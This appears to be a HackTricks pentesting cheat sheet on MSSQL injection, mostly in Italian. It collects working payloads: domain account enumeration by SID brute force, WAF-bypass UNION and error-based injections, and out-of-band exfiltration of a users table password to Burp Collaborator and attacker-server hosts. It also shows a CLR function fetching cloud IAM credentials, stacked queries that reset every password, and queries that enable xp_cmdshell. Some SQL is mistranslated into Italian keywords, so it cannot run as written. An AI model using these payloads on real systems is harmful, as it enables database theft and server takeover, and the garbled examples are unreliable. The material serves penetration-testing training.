# MSSQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Enumerazione di Active Directory

È possibile **enumerare gli utenti di dominio tramite SQL injection all'interno di un server MSSQL** utilizzando le seguenti funzioni MSSQL:

- **`SELECT DEFAULT_DOMAIN()`**: Ottieni il nome del dominio corrente.
- **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Se conosci il nome del dominio (_DOMAIN_ in questo esempio), questa funzione restituirà il **SID dell'utente Administrator** in formato esadecimale. Questo apparirà come `0x01050000000[...]0000f401`, nota come gli **ultimi 4 byte** siano il numero **500** in formato **big endian**, che è il **ID comune dell'utente administrator**.\
Questa funzione ti permetterà di **conoscere l'ID del dominio** (tutti i byte tranne gli ultimi 4).
- **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Questa funzione restituirà il **nome utente dell'ID indicato** (se presente), in questo caso **0000e803** in big endian == **1000** (di solito questo è l'ID del primo ID utente regolare creato). Poi puoi immaginare di poter forzare gli ID utente da 1000 a 2000 e probabilmente ottenere tutti i nomi utente degli utenti del dominio. Ad esempio utilizzando una funzione come la seguente:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Vettori alternativi basati su errori**

Le iniezioni SQL basate su errori somigliano tipicamente a costruzioni come `+AND+1=@@version--` e varianti basate sull'operatore «OR». Le query contenenti tali espressioni sono solitamente bloccate dai WAF. Come bypass, concatenare una stringa utilizzando il carattere %2b con il risultato di chiamate a funzioni specifiche che attivano un errore di conversione del tipo di dato sui dati ricercati.

Alcuni esempi di tali funzioni:

- `SUSER_NAME()`
- `USER_NAME()`
- `PERMISSIONS()`
- `DB_NAME()`
- `FILE_NAME()`
- `TYPE_NAME()`
- `COL_NAME()`

Esempio di utilizzo della funzione `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Questi trucchi SSRF [sono stati presi da qui](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Richiede il permesso **`VIEW SERVER STATE`** sul server.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Richiede il permesso **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Richiede il permesso **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Le stored procedure come `xp_dirtree`, sebbene non siano ufficialmente documentate da Microsoft, sono state descritte da altri online a causa della loro utilità nelle operazioni di rete all'interno di MSSQL. Queste procedure sono spesso utilizzate nell'Out of Band Data exfiltration, come mostrato in vari [examples](https://www.notsosecure.com/oob-exploitation-cheatsheet/) e [posts](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

La stored procedure `xp_dirtree`, ad esempio, viene utilizzata per effettuare richieste di rete, ma è limitata solo alla porta TCP 445. Il numero di porta non è modificabile, ma consente di leggere dalle condivisioni di rete. L'uso è dimostrato nello script SQL qui sotto:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
È importante notare che questo metodo potrebbe non funzionare su tutte le configurazioni di sistema, come su `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` in esecuzione su un `Windows Server 2016 Datacenter` con impostazioni predefinite.

Inoltre, ci sono procedure memorizzate alternative come `master..xp_fileexist` e `xp_subdirs` che possono ottenere risultati simili. Ulteriori dettagli su `xp_fileexist` possono essere trovati in questo [TechNet article](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Ovviamente potresti anche usare **`xp_cmdshell`** per **eseguire** qualcosa che attiva un **SSRF**. Per ulteriori informazioni **leggi la sezione pertinente** nella pagina:

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Creare una CLR UDF (Common Language Runtime User Defined Function), che è codice scritto in qualsiasi linguaggio .NET e compilato in un DLL, da caricare all'interno di MSSQL per eseguire funzioni personalizzate, è un processo che richiede accesso `dbo`. Ciò significa che di solito è fattibile solo quando la connessione al database viene effettuata come `sa` o con un ruolo di Amministratore.

Un progetto di Visual Studio e istruzioni per l'installazione sono forniti in [questo Github repository](https://github.com/infiniteloopltd/SQLHttp) per facilitare il caricamento del binario in MSSQL come assembly CLR, abilitando così l'esecuzione di richieste HTTP GET dall'interno di MSSQL.

Il nucleo di questa funzionalità è racchiuso nel file `http.cs`, che utilizza la classe `WebClient` per eseguire una richiesta GET e recuperare contenuti come illustrato di seguito:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Prima di eseguire il comando SQL `CREATE ASSEMBLY`, è consigliato eseguire il seguente frammento SQL per aggiungere l'hash SHA512 dell'assembly alla lista delle assembly fidate del server (visibile tramite `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Dopo aver aggiunto con successo l'assembly e creato la funzione, il seguente codice SQL può essere utilizzato per eseguire richieste HTTP:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Sfruttamento Veloce: Recupero del Contenuto Completo di una Tabella in una Singola Query**

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Un metodo conciso per estrarre il contenuto completo di una tabella in una singola query prevede l'utilizzo della clausola `FOR JSON`. Questo approccio è più conciso rispetto all'uso della clausola `FOR XML`, che richiede una modalità specifica come "raw". La clausola `FOR JSON` è preferita per la sua brevità.

Ecco come recuperare lo schema, le tabelle e le colonne dal database corrente:
````sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
````

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 или %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
usa [tempdb]
crea tabella [test] ([id] int)
inserisci [test] valori(1)
seleziona [id] da [test]
elimina tabella [test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Aggiungere un exec() inutile alla fine e far credere al WAF che questa non sia una query valida
admina'union select 1,'admin','testtest123'exec('select 1')--
## Questo sarà:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Utilizzando query costruite in modo strano
admin'exec('update[users]set[password]=''a''')--
## Questo sarà:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# O abilitando xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Questo sarà
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{{#include ../../banners/hacktricks-training.md}}
